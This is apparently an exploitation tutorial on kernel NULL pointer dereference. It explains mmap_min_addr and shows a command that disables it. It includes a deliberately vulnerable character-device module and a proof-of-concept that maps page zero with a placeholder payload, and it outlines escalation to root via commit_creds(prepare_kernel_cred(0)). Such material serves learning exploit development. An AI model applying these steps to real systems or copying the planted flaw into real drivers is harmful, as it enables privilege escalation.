## **Null pointer dereference**

* **A Null Pointer Dereference vulnerability occurs when a program dereferences a pointer that evaluates to NULL (`0x0`), expecting it to reference a valid memory location.**
  + It commonly arises when a pointer variable is not initialized or fails an allocation check.
  + This vulnerability exists across C, C++, Java, C#, Objective-C, and other programming languages.
* **While the typical impact is Denial of Service (DoS), under specific configurations where the zero page can be mapped, it can lead to arbitrary kernel code execution.**

:::note[Null pointer dereference]
* <https://cwe.mitre.org/data/definitions/476.html>
* <https://www.cvedetails.com/cwe-details/476/cwe.html>
* <https://www.cvedetails.com/vulnerability-list/cweid-476/vulnerabilities.html>
:::

## **0-address protection**

* Because the kernel and user space share virtual address ranges, 0-address protection prevents user space `mmap()` from mapping memory starting at address 0.
* This protection mitigates kernel NULL pointer dereference exploits.
* 0-address protection was introduced in Linux 2.6.22 and configured via `vm.mmap_min_addr`.
  + Since Ubuntu 9.04, `mmap_min_addr` is configured by default (typically 64k on x86, 32k on ARM).

```sh title="Check the mmap_min_addr"
lazenca0x0@ubuntu:~$ sysctl vm.mmap_min_addr
vm.mmap_min_addr = 65536
lazenca0x0@ubuntu:~$
```

```sh title="Disable mmap_min_addr"
lazenca0x0@ubuntu:~$ sudo sysctl -w vm.mmap_min_addr="0"
vm.mmap_min_addr = 0
lazenca0x0@ubuntu:~$
```

:::note[0-addresss protection]
* <https://wiki.ubuntu.com/Security/Features>
:::

## **Example**

### Source code of module

* **The following code modifies `escalation.c` from [04.Creating a kernel module to privilege escalation](../01.development-of-569/04.creating-a-kern-572.md) to demonstrate a NULL pointer dereference:**
  + Declares an uninitialized function pointer:
    - `void (*myFunPtr)(void);`
  + In `chardev_write()`, `myFunPtr()` is invoked directly without initialization, calling address `0x0`.

```c title="chardev.c"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <asm/current.h>
#include <linux/uaccess.h>

 
MODULE_LICENSE("Dual BSD/GPL");
 
#define DRIVER_NAME "chardev"
#define BUFFER_SIZE 64
     
static const unsigned int MINOR_BASE = 0;
static const unsigned int MINOR_NUM  = 2;
static unsigned int chardev_major;
static struct cdev chardev_cdev;
static struct class *chardev_class = NULL;
 
static int     chardev_release(struct inode *, struct file *);
static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *);

struct file_operations chardev_fops = {
    .release = chardev_release,
    .write   = chardev_write,
};

struct data {
    unsigned char buffer[BUFFER_SIZE];
};

static int chardev_init(void)
{
    int alloc_ret = 0;
    int cdev_err = 0;
    dev_t dev;
 
    printk("The chardev_init() function has been called.");
     
    alloc_ret = alloc_chrdev_region(&dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME);
    if (alloc_ret != 0) {
        printk(KERN_ERR  "alloc_chrdev_region = %d\n", alloc_ret);
        return -1;
    }
    //Get the major number value in dev.
    chardev_major = MAJOR(dev);
    dev = MKDEV(chardev_major, MINOR_BASE);
 
    //initialize a cdev structure
    cdev_init(&chardev_cdev, &chardev_fops);
    chardev_cdev.owner = THIS_MODULE;
 
    //add a char device to the system
    cdev_err = cdev_add(&chardev_cdev, dev, MINOR_NUM);
    if (cdev_err != 0) {
        printk(KERN_ERR  "cdev_add = %d\n", alloc_ret);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
 
    chardev_class = class_create(THIS_MODULE, "chardev");
    if (IS_ERR(chardev_class)) {
        printk(KERN_ERR  "class_create\n");
        cdev_del(&chardev_cdev);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
 
    device_create(chardev_class, NULL, MKDEV(chardev_major, MINOR_BASE), NULL, "chardev%d", MINOR_BASE);
 
    return 0;
}
 
static void chardev_exit(void)
{
    int minor; 
    dev_t dev = MKDEV(chardev_major, MINOR_BASE);
     
    printk("The chardev_exit() function has been called.");
     
    for (minor = MINOR_BASE; minor < MINOR_BASE + MINOR_NUM; minor++) {
        device_destroy(chardev_class, MKDEV(chardev_major, minor));
    }
 
    class_destroy(chardev_class);
    cdev_del(&chardev_cdev);
    unregister_chrdev_region(dev, MINOR_NUM);
}
 
static int chardev_release(struct inode *inode, struct file *file)
{
    printk("The chardev_release() function has been called.");
    if (file->private_data) {
        kfree(file->private_data);
        file->private_data = NULL;
    }
    return 0;
}

void (*myFunPtr)(void);
static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
    myFunPtr();
    return count;
}

module_init(chardev_init);
module_exit(chardev_exit);
```

## **Proof of Concept**

### PoC code

* **Test the NULL pointer dereference vulnerability:**
  + Map page `0x0` with read, write, and execute permissions using `mmap()`.
  + Copy a test shellcode payload into address `0x0` using `memcpy()`.
    - The payload executes `call 0xdeadbeef`.
  + Open `/dev/chardev0` and call `write()` to trigger `chardev_write()`.

```c title="test.c"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>

char payload[] = "\xe8\xea\xbe\xad\xde"; //call 0xdeadbeef

int main(){

    char *addr = mmap(0, 4096,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,-1, 0);

    if(addr != 0){
        printf("[*]Unable to map zero page.\n");
        exit(-1);
    }

    printf("[*] Mapped zero page.\n");
    memcpy(0, payload, sizeof(payload));

    int fd = open("/dev/chardev0", O_WRONLY);
    if(0 < fd){
        write(fd, "AAAA", 4);
        close(fd);
    }else{
        printf("Failed to open file.\n");
    }
    
    return 0;
}
```

## **Exploit method**

* **Exploitation workflow:**
:::note
* Write shellcode that executes:
  + `commit_creds(prepare_kernel_cred(0))`
* Map page `0x0` using `mmap()` and write the shellcode there.
* Trigger the NULL pointer dereference in the driver to execute the shellcode at `0x0`.
* Call `system("/bin/sh")` in user space to spawn a root shell.
:::

:::note[Required Addresses]
* Address of `prepare_kernel_cred()`
* Address of `commit_creds()`
:::
